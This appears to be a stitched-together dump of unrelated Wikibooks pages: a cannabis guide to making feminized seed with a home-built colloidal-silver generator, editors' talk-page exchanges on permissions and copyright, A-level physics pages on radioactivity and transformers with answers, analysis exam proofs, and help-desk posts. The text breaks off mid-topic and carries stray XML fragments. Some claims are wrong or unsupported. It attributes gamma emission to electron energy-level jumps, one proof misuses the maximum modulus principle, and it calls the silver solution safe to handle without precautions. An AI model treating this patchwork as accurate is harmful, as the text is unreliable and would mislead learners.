To make feminized seed you must induce male flowers in a female plant. There is all sorts of information on the Internet about doing this with light stress (light interruptions during flowering) and other forms of stress. The best of the stress techniques is to simply keep the plant in the flowering stage well past ripeness and it will produce a flower.

Stress techniques will work but whatever genetic weakness caused the plants to produce a male flower under stress will be carried on to the seeds. This means the resulting seeds have a known tendency to produce hermaphrodites. Fortunately, environmental stress is not the only way to produce male flowers in a female plant.

The ideal way to produce feminized seed through hormonal alteration of the plant. By adding or inhibiting plant hormones you can cause the plant to produce male flowers. Because you did not select a plant that produces male flowers under stress there is no genetic predisposition to hermaphroditism in the seed vs plants bred between a male and female parent. There are actually a few ways to do this, the easiest I will list here.

==== Colloidal Silver (CS) ====
This is the least expensive and most privacy conscious way to produce fem seed. CS has gotten a bad name because there is so much bad information spread around about its production and concentrations. It doesn't help that there are those who believe in drinking low concentration colloidal silver for good health and there is information mixed in about how to produce that low concentration food grade product. Follow the information here and you will consistently produce effective CS and know how to apply it to get consistent results.

Simply construct a generator using a 9-12v power supply (DC output, if it says AC then its no good) that can deliver at least 250ma (most wall wart type power supplies work, batteries are not recommended since their output varies over time). The supply will have a positive and negative lead, attach silver to each lead (contrary to Internet rumors, you aren't drinking this is cheap 925 silver is more than pure enough) you can expose the leads by clipping off the round plug at the end and splitting the wires, one will be positive and the other negative just like any old battery. Submerge both leads about 2-3 inches apart in a glass of distilled water (roughly 8oz). Let this run for 8-24hrs (until the liquid reads 12-15ppm) and when you return the liquid will be a purple or silver hue and there may be some precipitate on the bottom.

This liquid is called colloidal silver. It is nothing more or less than fine particles of silver suspended in water so it is a completely natural solution and is safe to handle without any special precautions. The silver inhibits female flowering hormones in cannabis and so the result is that male flowering hormone dominates and male flowers are produced.

To use the silver, spray on a plant or branch three days prior to switching the lights to 12/12 and continue spraying every three days until you see the first male flowers. Repeated applications after the first flowers appear may result in more male flowers and therefore more pollen. As the plant matures it will produce pollen that can be collected and used to pollinate any female flower (including flowers on the same plant).

==== Silver Thiosulfate (STS) ====
Silver Thiosulfate works on the same principle, application and results of CS, that is harder to make. It is more difficult to acquire, but it can be obtained directly from a chemical supply company. STS is not expensive or controlled.

==== [[w:Gibberellic acid|Gibberellic Acid]] (GA3) ====
This is probably the most popular way to produce feminized seed, but at the same time the least effective. GA3 is a plant hormone that also causes the plant to stretch uncontrollably. It can be purchased readily in powdered form, a quick search reveals numerous sources on e-bay for as little as $15.

== Re: Copyrights and creative control ==

Hello Shaitand, how are you? I saw the discussion at [[WB:RFA]] seems to have gotten a little bit crazy since I last looked at it, and it seems like some incorrect information is flying around on both sides. I'm very happy to have you promoted to +Editor because it looks like you're going to be here a while and a few other people have supported you for promotion. However, I want to make a few points first to make sure you are aware of some things:
# There is no notion of &quot;editorial control&quot; on Wikibooks, and no one person has any amount of &quot;authority&quot; over a book here then any other user has. That is, with +Editor or +Rollbacker or any other priviledge, it is against our policy for you to restrict access, to limit the ability of other people to edit, etc. When you make an edit to Wikibooks you are granting wikibooks an unrevokable license to host your content for other people to freely modify. To this end, you also cannot demand that your work be deleted from here if the project doesn't work out (you can politely request it, of course, and we will consider the request fairly).
# You do claim that you only want these rights for use with your own book, but technologically that's not the way they work here. When you get a permission, it can be used throughout the project. A lot of people take this fact into consideration on [[WB:RFA]], even if you claim you're only interested in one book. 
# The FlaggedRevs extension (which introduces the sighting and +Editor) role is a relatively new addition to Wikibooks and is not without it's flaws. There are a number of changes that we could make to it's configuration, but we need to get feedback from users like yourself so we can tune it to make it better in the future. I was already an administrator here when FlaggedRevs was installed and I was automaticaly promoted to +Reviewer because of it, so I (and other admins) are not always aware of how difficult it is for new users. Your feedback on this issue would be much appreciated.

I would like to make sure that you understand #1 above and that you're okay with it. If you don't have any problems I'll be happy to promote you to +Editor. Also, if you have any questions or need any help as you contribute, never hesitate to ask. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 21:46, 20 May 2009 (UTC)

:Absolutely. I never had a problem with others being involved and contributing to the work. My primary concern was and is making the material available to others who need it. This particular book provides instruction that helps a great many people ease severe pain and nausea without the need to resort to highly addictive narcotic painkillers with significant side effects. Although the book is far from print quality at this stage it is easily complete enough for the material to be effectively used by those who need it. It was only after everything had been available for more than a week that I finally made my request. Up until that point I had hoped the individual who sighted the outline in the first place would return. It was then evident to me that the only way material would be made available in the timely manner was if I had the +editor permission myself.

:It wasn't until after I made my request that I became truly concerned on two points. I am an open content advocate and in truth do not even believe that intellectual property protections should exist but I found the complete and utter lack of acknowledgment for the author and contributor of a large work to be frightening. I never intended to remove the work already contributed but I did find it quite alarming that the immediate reaction to me suggesting I keep the official version of the book elsewhere was that if I didn't wish my work presented on the site the staff would use a legal technicality to steal the work on behalf of the community. This is quite alarming because the larger open content community in which I participate certainly would not approve of using a work in a way the creator disapproved of without some sort of just cause. The creator of a work is generally given a certain level of respect and gratitude for his/her/its contribution and in general deference until such time as that deference is believed to be detrimental to a work that is largely composed of contributions

:I suppose the biggest bit of feedback I can give to date is that it should be the official policy of the project to lean toward the will of primary authors. It is no small thing to write a book and it is an even greater thing to then give that book away. Once given others contribute and it slowly morphs from being the work of the original author to being that of the community but unless there is some pressing reason to disregard the will of the author it should not be done. Put that in an article and request comments in a place where the bulk of those who contribute (not merely those who follow the administrative pages on the site) can see it and I am certain you will find few who disagree. Additionally, I would strongly recommend a policy that permissions requests be considered without regard to auto-promotion requirements. One is an automatic system which must through hard coded metrics use a standard high enough to provide reasonable assurance of merit. The other is an actual manual human review where the specific judgement calls of the individual can be seen via their edit history. A human can tell more from prolific editing that all occurs within the span of a day than a machine can tell with months of history. 

:For example, how I handle contributions and the need for deletion can already been seen in my history. A non-native speaker made some small contributions to the draft, adding a navigation template (something I did not yet know how to do) and some content. Part of the content was made outside of the book outline, it didn't fit with the structure of the book and was already duplicated elsewhere (aside from being in broken and largely incoherent English). This I did remove with an edit comment to please follow the outline and that the content was duplicated elsewhere. The other part was written to fit within the outline structure in a section I had not completed yet. This was kept, though largely rewritten to more legible English, corrected on minor parts that may have been inaccurate due to translation and expanded with additional content.

:As for the technical capabilities of the permissions model it really should be looked into. A more fine grained permissions structure that allows limiting permissions to a page or tree or name space would allow for enhanced permissions for a single book or even chapter in larger books and even the automatic granting of +editor for pages created by an individual and the subpage, etc. That is a system that rewards contribution with recognition and gives permissions automatically in a granular manner to those most likely to need them.

:Sorry if this was more feedback than you had in mind. Brevity has never been my strong suit but it is my hope that the criticism is constructive and the suggestions are useful. --[[User:Shaitand|Shaitand]] ([[User talk:Shaitand|talk]]) 19:24, 21 May 2009 (UTC)

::Can never have too much feedback, thanks for your thoughtful reply. I have promoted you to +Editor now, please let me know if you need any help using that tool, or if you have any additional feedback about the mechanics of it.
::What you say about the primary author of a work getting a certain amount of consideration from other community members is generally taken to be a ''de facto'' guideline, but for a number of reasons we cannot make such a sentiment &quot;official&quot; policy. Unfortunately we have had some history with subversive elements that attempt to exercise strict editorial control over books, often to the detriment of the larger community. We've also been confronted with a number of ultimatums from these kinds of users demanding significant concessions and &quot;power&quot; or else they will have their book deleted. So, it's with that experience in mind that some users were overly defensive and technical on [[WB:RFP]]. Please don't take it as any kind of personal affront, it is certainly not intended to be that way.
::We have a number of technical hurdles here at Wikibooks that stem mostly from the fact that MediaWiki was designed and tuned for use with the Wikipedia. Even the FlaggedRevs extension was designed and tested originally for encyclopedia-based projects, where a notion of a &quot;book&quot; is completely foreign. We were hoping that we could bend and configure the extension to our specific needs, but I personally have developed a number of criticisms about the way the extension has been working so far. I've argued more then once in the past to have it disabled entirely, but there doesn't seem to be a critical mass of support for that yet. This is why feedback from users like yourself is so critical, because we are going to have to change the extension (if not remove it entirely) and we need to find the best way to do that. We also need to make sure that the entire community is aware of the problems experienced by ou newest users, because if FlaggedRevs is a major roadblock to usability, then it is a detriment more then it is a help.
::All that said, thanks again for the feedback, good luck with your editing work, and don't hesitate to ask if you need help. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 11:59, 22 May 2009 (UTC)

I do not know if it was you logged out who restored the copyright notice on the Marijuana Cultivation book, but I placed it at [[Marijuana Cultivation/Introduction]] instead.  Given that you were also the primary contributor and this email address and name may not be you, I wanted to verify that it really was you and not someone trying to take credit for your work. &amp;ndash;&amp;nbsp;[[User:Adrignola|Adrignola]]&amp;nbsp;&lt;small&gt;[[User talk:Adrignola|talk]]&lt;/small&gt; 03:33, 9 October 2010 (UTC)

That was awhile back and I honestly don't remember if that was me but it is my information. The introduction page seems like a logical place for the notice. I actually went ahead and removed the email address as it is no longer valid. Looking over the edits and contributions I am very glad to have contributed this material. Working with medical marijuana dispensaries I've encountered several who provide this book as a guide for patients who want to produce their own medicine. This has made a real difference in the quality of life of many sick people and it is a credit to everyone who has contributed and people like you who have worked so hard to help preserve and maintain this book.

      <text xml:space="preserve">[[Image:Table_isotopes_en.svg|right|thumb|400px|Table of the number of neutrons and protons in the nuclei of isotopes, showing their most common mode of decay.]]
'Radioactivity' is a catch-all term for several different emissions from the nuclei of 'radioactive' atoms. There are three main types of radiation: alpha (&amp;alpha;), beta (&amp;beta;) and gamma (&amp;gamma;). When radiation  occurs, four things must be conserved:

* Mass

* Charge

* Lepton Number

* Baryon Number

In formulae, mass and charge are shown next to the symbol of the particle. For example, a neutron with mass 1u and no charge is &lt;math&gt;_0^1n&lt;/math&gt;. The charge on a nucleus is equal to the number of protons in the nucleus (electrons can be ignored). The lepton and baryon numbers may be obtained by counting the number of leptons and baryons on either side of the equation, remembering that antiparticles have negative lepton and baryon numbers.

==&amp;alpha; Radiation==
Unstable nuclei with a mass greater than 82u emit &amp;alpha; radiation. This consists of an Helium nucleus (&lt;math&gt;_2^4He&lt;/math&gt;). The alpha particle simply splits off from the nucleus. Since the particle has no electrons, it has a charge of +2e. This, combined with its relatively large mass, means that it reacts easily with other particles, ionising them, meaning that it cannot penetrate more than a few centimetres of air.

==&amp;beta; Radiation==
Unstable nuclei with a mass below 82u emit &amp;beta; radiation. There are two types of &amp;beta; radiation. &amp;beta;&lt;sup&gt;-&lt;/sup&gt; radiation consists of an electron (&lt;math&gt;_{-1}^0e&lt;/math&gt;). This is produced by nuclei with many more neutrons than protons. A neutron changes into a proton, emitting an electron and an antineutrino in order to balance the lepton number. &amp;beta;&lt;sup&gt;+&lt;/sup&gt; radiation consists of an positron (&lt;math&gt;_{1}^0e&lt;/math&gt;). This is produced by nuclei with roughly the same number of neutrons as protons. A proton changes into a neutron, emitting a positron and a neutrino.

&amp;beta; particles also ionise particles, but since they have less charge and mass, they do this less easily, and so they travel further (on average). Both &amp;alpha; and &amp;beta; radiation result in the nucleus which emitted them being changed into another element (Transmutation).

==&amp;gamma; Radiation==
The [[A-level_Physics_(Advancing_Physics)/Binding_Energy|binding energies]] of nuclei are quantized - they can only take on certain values. When an electron jumps down an energy level, this energy has to go somewhere - it takes the form of a &amp;gamma; photon. The structure of the nucleus is not changed by &amp;gamma; radiation. &amp;gamma; radiation is ionising, but only at the right frequency - the resonant frequency of the things it ionises. &amp;gamma; radiation travels very far, and only a good thick layer of lead can stop it.

==Questions==

You will need a [[w:Periodic_Table|periodic table]].

1. Americium-241 is an &amp;alpha; emitter. What element, and what isotope, is produced by this decay?

2. Iodine-129 is a &amp;beta;&lt;sup&gt;-&lt;/sup&gt; emitter. What element, and what isotope, is produced by this decay?

3. Gamma rays are used to kill microbes in food. Why doesn't the food become radioactive?

4. Plutonium-244 decays by emitting an &amp;alpha; particle. It does this twice, emits a &amp;beta;&lt;sup&gt;-&lt;/sup&gt; particle, and then emits a further two &amp;alpha; particles. The nucleus becomes a different element each time. What element is produced at the end?

5. Carbon-11 changes into Boron-11 by a radioactive emission. What was emitted?

6. Uranium-236 decays, following the equation:

&lt;math&gt;_{92}^{236}U \to\; _{90}^{232}Th + \; X &lt;/math&gt;

Identify the particle X in this equation.

'''1. Americium-241 is an &amp;alpha; emitter. What element, and what isotope, is produced by this decay?'''

&lt;math&gt;_{95}^{241}Am \to \;_a^b? + \;_2^4\alpha&lt;/math&gt;

b = 241 - 4 = 237

a = 95 - 2 = 93

So, &lt;math&gt;_{93}^{237}Np&lt;/math&gt; (Neptunium-237) is produced.

'''2. Iodine-129 is a &amp;beta;&lt;sup&gt;-&lt;/sup&gt; emitter. What element, and what isotope, is produced by this decay?'''

&lt;math&gt;_{53}^{129}I \to \;_a^b? + \;_{-1}^0\beta^{-} + \;_0^0\bar{\nu}&lt;/math&gt;

b = 129

a = 53 + 1 = 54

So, &lt;math&gt;_{54}^{129}Xe&lt;/math&gt; (Xenon-129) is produced.

'''3. Gamma rays are used to kill microbes in food. Why doesn't the food become radioactive?'''

Gamma radiation only interacts with the electrons of the atom, not with the nucleus. Radioactivity is due to nuclear properties, not chemical properties.

'''4. Plutonium-244 decays by emitting an &amp;alpha; particle. It does this twice, emits a &amp;beta;&lt;sup&gt;-&lt;/sup&gt; particle, and then emits a further two &amp;alpha; particles. The nucleus becomes a different element each time. What element is produced at the end?'''

&lt;math&gt;_{94}^{244}Pu \to \;_a^b? + \;4\;_2^4\alpha + \;_{-1}^0\beta^{-}&lt;/math&gt;

b = 244 - 16 = 228

a = 94 - 8 + 1 = 87

So, at the end of this decay chain, &lt;math&gt;_{87}^{228}Fr&lt;/math&gt; (Francium-228) is produced.

'''5. Carbon-11 changes into Boron-11 by a radioactive emission. What was emitted?'''

&lt;math&gt;_6^{11}C \to\; _5^{11}B + \;_a^b?&lt;/math&gt;

b = 11 - 11 = 0

a = 6 - 5 = 1

So, a positron (&lt;math&gt;_1^0\beta^{+}&lt;/math&gt;) was emitted. However, in order for the lepton numbers to balance, a neutrino (&lt;math&gt;_0^0\nu&lt;/math&gt;) must also be emitted.

'''6. Uranium-236 decays, following the equation:'''

&lt;math&gt;_{92}^{236}U \to\; _{90}^{232}Th + \; X &lt;/math&gt;

'''Identify the particle X in this equation.'''

Solve these type of problems by applying the conservation laws: e.g. the decay must balance electric charge, nucleon number, proton number, lepton number etc. 
Nucleon number doesn't balance (236 = 232 + ?), so X must have a nucleon number of 4. 

The Proton number does not balance either (92 = 90 + ?) therefore X must have 2 Protons.

Therefore it can be concluded that X is an alpha particle.

      <comment>/* Eddy Currents */</comment>
      <text xml:space="preserve">[[Image:Transformer3d_col3.svg|right|thumb|400px|An ideal step-down transformer showing magnetic flux in the core.]]
We have already seen that a change in flux induces an emf in a coil, given by Faraday's Law:

&lt;math&gt;\epsilon = -N\frac{d\phi}{dt}&lt;/math&gt;

We have also seen that a voltage in a coil induces a magnetic flux inside the coil. If we were to connect two coils with the same core, the flux, and the rate of change of flux, would be exactly the same inside both coils. We would have created a kind of flux circuit known as a transformer. The ratio between the voltage at the primary coil V&lt;sub&gt;p&lt;/sub&gt; and the voltage at the secondary coil V&lt;sub&gt;s&lt;/sub&gt; would have to be (since &amp;phi; is constant):

&lt;math&gt;\frac{V_p}{V_s} = \frac{-N_p\frac{d\phi}{dt}}{-N_s\frac{d\phi}{dt}} = \frac{N_p}{N_s}&lt;/math&gt;,

where N&lt;sub&gt;p&lt;/sub&gt; and N&lt;sub&gt;s&lt;/sub&gt; are the numbers of coils in the primary and secondary coils respectively.

In other words, we can change the voltage of some electricity by varying the number of coils in each coil. In order for this to work, the current used must be an alternating current (AC). This means that the current and voltage are constantly changing sinusoidally, and so there is a sinusoidal change in flux. This means that an emf is induced in the secondary coil. If the flux did not change (i.e. we were using direct current), then no emf would be induced, and the transformer would be useless except as a magnet (since it would still have a flux circuit in it).

==Ideal Transformers==
An ideal transformer is one in which all the electrical energy put into one coil comes out of the other coil. An ideal transformer does not exist, but, since it makes the maths easy, we like to pretend that it does. In this case, the power in must equal the power out:

&lt;math&gt;P = P_p = P_s = I_pV_p = I_sV_s&lt;/math&gt;,

where I&lt;sub&gt;p&lt;/sub&gt; and I&lt;sub&gt;s&lt;/sub&gt; are the currents in the primary and secondary coils, respectively. So:

&lt;math&gt;V_p = \frac{P}{I_p}&lt;/math&gt; and &lt;math&gt;V_s = \frac{P}{I_s}&lt;/math&gt;

By substitution into the transformer equation for voltage:

&lt;math&gt;\frac{N_p}{N_s} = \frac{V_p}{V_s} = \frac{\frac{P}{I_p}}{\frac{P}{I_s}} = \frac{\frac{1}{I_p}}{\frac{1}{I_s}} = \frac{I_s}{I_p}&lt;/math&gt;

So, in an ideal transformer, the ratio between the voltages is equal to the ratio between the numbers of coils, but the ratio between the currents is equal to the ''reciprocal'' of the ratio between the numbers of coils.

==Eddy Currents==
In reality, the electrical energy is not all conserved - a lot of it is converted into heat by eddy currents. In a transformer, the magnetic flux created by the primary coil induces a current in the core. This occurs in order to oppose the change that produced the magnetic flux (Lenz's Law). The currents flowing in the core are called eddy currents.

These currents produce heat, using up energy and so causing inefficiency. One way of minimising the effects of eddy currents is to make the core out of iron laminate. This is layers of iron separated by thin layers of an insulator such as varnish. The amplitude of the eddy currents produced is reduced as currents cannot flow through the layers of insulator. (Note: OCR B question papers tend to have a question on eddy currents.)

==Questions==

1. A step-down transformer has 300 coils on one coil, and 50 coils on the other. If 30 kV AC is put in, what voltage comes out?

2. A step-up transformer has 200 coils on one coil, and 980 coils on the other. If  25 kV AC comes out, what voltage was put in?

3. An ideal transformer transforms a 50A current into a 1A current. It has 40 coils on the primary coil. How many coils are in the secondary coil?

4. Transformers tend to vibrate. Why is this? What effect does this have on the efficiency of the transformer?

5. Air does have some permeability. What effect does this have on the efficiency of the transformer? Why?

      <text xml:space="preserve">'''1. A step-down transformer has 300 coils on one coil, and 50 coils on the other. If 30 kV AC is put in, what voltage comes out?'''

&lt;math&gt;\frac{300}{50} = \frac{30000}{V_s} = 6&lt;/math&gt;

&lt;math&gt;V_s = \frac{30000}{6} = 5\mbox{ kV}&lt;/math&gt;

'''2. A step-up transformer has 200 coils on one coil, and 980 coils on the other. If 25 kV AC comes out, what voltage was put in?'''

&lt;math&gt;\frac{200}{980} = \frac{V_p}{25000}&lt;/math&gt;

&lt;math&gt;V_p = \frac{25000 \times 200}{980} \approx 5.1\mbox{ kV}&lt;/math&gt;

'''3. An ideal transformer transforms a 50A current into a 1A current. It has 40 coils on the primary coil. How many coils are in the secondary coil?'''

&lt;math&gt;\frac{50}{1} = \frac{N_s}{40} = 50&lt;/math&gt;

&lt;math&gt;N_s = 40 \times 50 = 2000\mbox{ coils}&lt;/math&gt;

'''4. Transformers tend to vibrate. Why is this? What effect does this have on the efficiency of the transformer?'''

There are wires with current in them going perpendicularly through a magnetic field. According to F = BIL, a force is exerted on the wires. This means that some of the energy is converted into kinetic energy, reducing the efficiency of the transformer.

'''5. Air does have some permeability. What effect does this have on the efficiency of the transformer? Why?'''

Some of the flux passes through the air instead of the core, and so does not pass through the secondary coil, and is not used to create AC. This means that some of the energy put in oscillates in and out of the magnetic field, reducing the efficiency of the transformer.

Suppose that &lt;math&gt;f,g \!\,&lt;/math&gt; are analytic on &lt;math&gt;\{ |z| \leq 1 \} \!\,&lt;/math&gt;
with &lt;math&gt;g \neq 0 \!\,&lt;/math&gt; on &lt;math&gt;\{ |z| &lt; 1 \} \!\,&lt;/math&gt;.  Prove that &lt;math&gt; |f(z)| \leq |g(z)|\!\,&lt;/math&gt; for all &lt;math&gt;z \in \{ |z|=1\} \!\,&lt;/math&gt; implies &lt;math&gt; |f(0)| \leq |g(0)|\!\,&lt;/math&gt;
|}

==Solution 4==

===Define new function h(z)===

Define &lt;math&gt; h(z)= \frac{f(z)}{g(z)}  \!\,&lt;/math&gt;.

==== h is continuous on the closure of D ====

Since &lt;math&gt;   g \neq 0  \!\,&lt;/math&gt; on &lt;math&gt; D   \!\,&lt;/math&gt;, then by the Maximum Modulus Principle, &lt;math&gt;      g \!\,&lt;/math&gt; is not zero in &lt;math&gt;  \overline{D}           \!\,&lt;/math&gt;.  

Hence, since &lt;math&gt;  f              \!\,&lt;/math&gt;    and  &lt;math&gt;        g        \!\,&lt;/math&gt; are analytic on &lt;math&gt;    \overline{D}            \!\,&lt;/math&gt;   and &lt;math&gt;  g \neq 0     \!\,&lt;/math&gt; on &lt;math&gt;   \overline{D}             \!\,&lt;/math&gt;,     then     &lt;math&gt;     h  \!\,&lt;/math&gt; is analytic on &lt;math&gt;   \overline{D}             \!\,&lt;/math&gt; which implies &lt;math&gt;       h    \!\,&lt;/math&gt; is continuous on &lt;math&gt;  \overline{D}        \!\,&lt;/math&gt;

==== h is analytic on D ====

This follows from above

===Case 1: h(z) non-constant on D===
If &lt;math&gt;     h        \!\,&lt;/math&gt; is not constant on &lt;math&gt;   \overline{D}       \!\,&lt;/math&gt;, then by Maximum Modulus Principle, &lt;math&gt;                |h| \!\,&lt;/math&gt; achieves its maximum value on the boundary of &lt;math&gt;    D  \!\,&lt;/math&gt;.  


But since &lt;math&gt;  |h(z)| \leq 1       \!\,&lt;/math&gt; on &lt;math&gt;   \partial D  \!\,&lt;/math&gt; (by the hypothesis), then 


&lt;math&gt;  |h(z)| \leq 1     \!\,&lt;/math&gt; on &lt;math&gt;   \overline{D}             \!\,&lt;/math&gt;.   


In particular &lt;math&gt;  |h(0)| \leq 1              \!\,&lt;/math&gt;, or equivalently


&lt;math&gt;   |f(0)| \leq |g(0)|             \!\,&lt;/math&gt;

===Case 2: h(z) constant on D===

Suppose that &lt;math&gt;h(z) \!\,&lt;/math&gt; is constant. Then


&lt;math&gt;|h(z)|=\left|\frac{f(z)}{g(z)}\right| = |\alpha| \!\,&lt;/math&gt; where &lt;math&gt; \alpha \in \mathbb{C}\!\,&lt;/math&gt;


Then from hypothesis we have for all &lt;math&gt;z  \in \{|z|=1\}\!\,&lt;/math&gt;,


&lt;math&gt; |f(z)| = |\alpha||g(z)|\leq |g(z)|\ \!\,&lt;/math&gt;


which implies


&lt;math&gt;|\alpha| \leq 1 \!\,&lt;/math&gt;


Hence, by maximum modulus principle, for all &lt;math&gt;z \in D \!\,&lt;/math&gt;


&lt;math&gt;\left|\frac{f(z)}{g(z)}\right| = |\alpha| \leq 1 \!\,&lt;/math&gt;


i.e.


&lt;math&gt; |f(z)| \leq |g(z)|\!\,&lt;/math&gt;


Since &lt;math&gt;0 \in D \!\,&lt;/math&gt;, we also have


&lt;math&gt; |f(0)| \leq |g(0)| \!\,&lt;/math&gt;

Let &lt;math&gt;f \in L^1 (-\infty,\infty) \!\,&lt;/math&gt; and suppose &lt;math&gt;\alpha &gt; 0 \!\,&lt;/math&gt;. Set &lt;math&gt;f_n(x)=\frac{f(nx)}{n^{\alpha}} \!\,&lt;/math&gt; for &lt;math&gt;n=1,2,\ldots \!\,&lt;/math&gt;. Prove that for almost every &lt;math&gt;x \in (-\infty, \infty) \!\,&lt;/math&gt;, 


&lt;math&gt;\lim_{n \rightarrow \infty} f_n(x) =0 \!\,&lt;/math&gt;

|}

===Solution 3===
=== Change of variable ===

By change of variable (setting u=nx), we have


&lt;math&gt; \int |f_n(x)| dx  = \int \frac{|f(u)|}{n^{\alpha +1}} du \quad \quad (*)\!\,&lt;/math&gt;

=== Monotone Convergence Theorem ===

Define &lt;math&gt; u_n(x) = \sum_{i=1}^{n} |f_i(x)| \!\,&lt;/math&gt;.


Then, &lt;math&gt;  u_n      \!\,&lt;/math&gt; is a nonnegative increasing function converging to &lt;math&gt; \sum_{i=1}^{\infty} |f_i(x)| \!\,&lt;/math&gt;.


Hence, by Monotone Convergence Theorem and &lt;math&gt; (*) \!\,&lt;/math&gt;


&lt;math&gt; \begin{align}

 \int \sum_{i=1}^{\infty} |f_i(x)| dx &amp;= \sum_{i=1}^{\infty} \int |f_i(x)| dx \\

&amp;= \sum_{i=1}^{\infty} \int \frac{|f(x)|}{i^{\alpha +1 }}dx \\
&amp;= \left( \int |f(x)| dx\right) \left(  \sum_{i=1}^{\infty} \frac{1}{i^{\alpha +1 }}  \right) \\
&amp;&lt; \infty


\end{align}
\!\,&lt;/math&gt;


where the last inequality follows because the series converges (&lt;math&gt; \alpha &gt;0  \!\,&lt;/math&gt; ) and &lt;math&gt;   f \in L^1        \!\,&lt;/math&gt;

=== Conclusion ===
Since


&lt;math&gt;\int \sum_{i=1}^\infty |f_i(x)| dx &lt; \infty \!\,&lt;/math&gt;,


we have almost everywhere


&lt;math&gt;\sum_{i=1}^\infty |f_i(x)| &lt; \infty \!\,&lt;/math&gt;


This implies our desired conclusion:


&lt;math&gt;\lim_{i \rightarrow \infty} f_i(x) = 0 \quad \mbox{a.e.}\!\,&lt;/math&gt;

== Categorizing ==

Hi, there! Please, I need help putting the [[How to do nothing]] book in many categories, not only &quot;How-tos&quot;. I did try. I know an editor should try to solve his problems alone, but assistance is welcome, and encouraging. Some of us write, some of us edit, while others fix, maintain, right? Let's go for teamwork! Thanks!!!! [[User:Ricardoramalho|Ricardoramalho]] ([[User talk:Ricardoramalho|talk]]) 12:48, 6 April 2009 (UTC)

== I want to submit a book on Lisp that I wrote ==

I want to submit a book on lisp that I wrote.
(It is www.civilized.com/files/lispbook.pdf)

So, I have gotten a name and password, and clicked on &quot;add wiki page&quot;
- the closest thing I could find to 'upload your document'

- nothing happened of any interest.  There is a very obscure suggestion that
if click on 'create a book' found down in your help link, I can type in 
a book!!!    

Can you please tell me how to upload a pdf file to you as a contribution?

And, by the way, I guess the only way you can tell me is by sending me email?
my user name is knott  - I hope you can reach me with that.

Thanks, gary knott [[User:Knott|Knott]] ([[User talk:Knott|talk]]) 23:33, 7 April 2009 (UTC)   (what is this [[User:Knott|Knott]] ([[User talk:Knott|talk]]) 23:33, 7 April 2009 (UTC) stuff??? somewhat uncivilized, eh?)

by the way it says &quot;save page&quot; below.  What does that mean?
shouldn't it say &quot;submit message&quot;  (to someone)?

: Wikibooks is not just a venue to host free content, but (primarily) a forum for collaboration on authoring such works. See [[Help:Contents]] &amp;mdash; and [[Help:Starting a new page or book]] in particular. You could upload the PDF as a file, licensed under the GFDL (or, preferably, multi-license it under a number of free licenses) and link it from somewhere. You could browse around [[Subject:Programming]] to see if there is a nice place somewhere. New users have to wait four days before they can upload images (sorry for the inconvenience, but this is a trade-off to reduce some of the more nasty types of vandalism).
: You can set your email address in [[Special:Preferences|your preferences]] and other users can contact you through that (a web-form that doesn't reveal your address). Normal discussion, however, usually takes place on [[Help:talk page]]s. These discussion pages are normal wiki pages like all other; hence the &quot;save ''page''&quot;. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 15:45, 8 April 2009 (UTC)
== Imports ==

I would like to compile wikipedia articles into a wikibook that will correspond with Georgia's Performance standards for U.S. History. How long does it take to have articles imported into the wikibook?

: It depends on when you make the request and when the next attentive admin notices it.  I always make imports a priority because I know exactly how inconvenient it is to have to wait for them (having experienced that before gaining adminship).  Post your request on [[WB:RFI]], and it could be a couple of minutes.  Or several hours.  --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 01:46, 8 April 2009 (UTC)

== Wikimania 2009: Scholarships ==

Wikimania 2009, this year's global event devoted to [[foundation:Home|Wikimedia]] projects around the globe, is now accepting '''applications for scholarships''' to the conference.  This year's conference will be handled from August 26-28 in [[w:Buenos Aires|Buenos Aires]], [[w:Argentina|Argentina]].  The scholarship can be used to help offset the costs of travel and registration.  For more information, check the official [[wm2009:Scholarships|information page]].  Please remember that the [[wm2009:Call for Participation|Call for Participation]] is still open, please submit your papers!

== Copyright question. ==

While categorizing things in the mathematics subject, I noticed there are a few books that are exams and solutions for various schools.  When I write an exam I tend to think of it as my own work and would be rather annoyed if it appeared on the web somewhere.  Are there any copyright concerns over students reproducing there exams here? [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 15:56, 20 March 2009 (UTC)

: Whoever wrote the exam usually owns the copyright. If students are reproducing the exam that could be a problem. However probably depends on what you mean. If you mean students are actually copying an existing exam that's a problem, if you mean students are writing original content based on their own experiences with an exam, I don't think that is a problem. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 23:39, 20 March 2009 (UTC)

::Well I don't know how the students are reproducing the exams.  In many cases I am thinking of these are qualifying exams for specific universities.  It just seemed a bit dubious to me.

: Another question is if you hold the copyrights of your creation. If you created the exams while working for a school or University and no clause exist clarifying the issue, by default you got paid for that work so the rights revert to that institution. IANAL and I don't particularly fallow US copyright laws (as it can depend on state laws also, there is book on [[US Copyright Law]] here). It also seems that if those entities are funded by the U.S. federal government (public money) or if so determined by the state law, they can also fall into the public domain unless your contract did exclude your creative work in some fashion.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 00:45, 21 March 2009 (UTC)

:: These are interesting ideas, but I think the issues might be more subtle then this.  But this wouldn't apply to papers or books written by academics while being funded by their departments (remember many profs are paid but required to do no teaching at all) so I would be a bit surprised if exams were so different.  But maybe I should look into it.  :) [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 08:25, 21 March 2009 (UTC)

:::Authorship doesn't mean having the copyright as covered above, and if you written any papers you know it is common not only to indicate the institution but any grants used to produce the work. It all depends on the authors contract or license used in such works see also [[Wikibooks:Ownership]] the edit history and talk page also since it is a bit of a controversial issue...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 23:59, 21 March 2009 (UTC)

::::There were similar questions about this at [http://pt.wikiversity.org/w/index.php?title=Wikiversidade:Esplanada&amp;oldid=24725#Exerc.C3.ADcios_tem_VDA_.3F pt.wikiversity]. [[:pt:User:Helder.wiki|Helder]] 00:07, 15 April 2009 (UTC)

== Dual Licensing Vote ==

Some people have probably noticed the new banner advertisement for the licensing vote. Some background information:

